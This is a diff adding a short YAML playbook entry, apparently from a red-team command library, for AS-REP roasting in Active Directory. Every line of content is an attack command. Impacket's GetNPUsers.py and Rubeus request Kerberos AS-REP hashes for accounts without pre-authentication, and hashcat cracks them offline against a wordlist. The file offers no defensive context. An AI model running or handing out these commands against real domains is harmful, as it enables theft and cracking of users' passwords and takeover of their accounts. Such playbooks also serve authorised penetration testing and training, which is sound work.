@@ -1,0 +1,19 @@
+name: ASREPRoasting
+description: Request AS-REP for accounts without pre-auth and crack offline
+commands:
+- '# Impacket - target specific user (no auth required)'
+- GetNPUsers.py -dc-ip <DC_IP> '<DOMAIN>/<TARGET_USER>' -no-pass -format hashcat
+- ''
+- '# Impacket - from users file'
+- GetNPUsers.py -dc-ip <DC_IP> '<DOMAIN>/' -usersfile users.txt -format hashcat -outputfile hashes.txt
+- ''
+- '# Rubeus - all AS-REP roastable'
+- Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+- ''
+- '# Rubeus - target specific user'
+- Rubeus.exe asreproast /user:<TARGET_USER> /format:hashcat /outfile:hashes.txt
+- ''
+- '# Crack with hashcat'
+- hashcat -m 18200 hashes.txt wordlist.txt
+opsec: []
+references: []
